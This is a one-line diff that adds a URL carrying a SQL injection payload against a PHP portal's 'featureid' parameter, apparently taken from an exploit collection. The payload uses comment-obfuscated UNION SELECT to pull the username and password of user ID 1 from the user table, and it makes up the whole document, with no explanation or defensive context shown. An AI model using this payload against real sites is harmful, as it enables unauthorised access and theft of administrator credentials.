@@ -1,0 +1,1 @@
+http://www.example.com/portal.php?id=54&amp;a=viewfeature&amp;featureid=99999/**/UNION/**/SELECT/**/0,1,2,3,4,username,6,7,8,9,10,11,12,password/**/from/**/user/**/where/**/userid=1/*
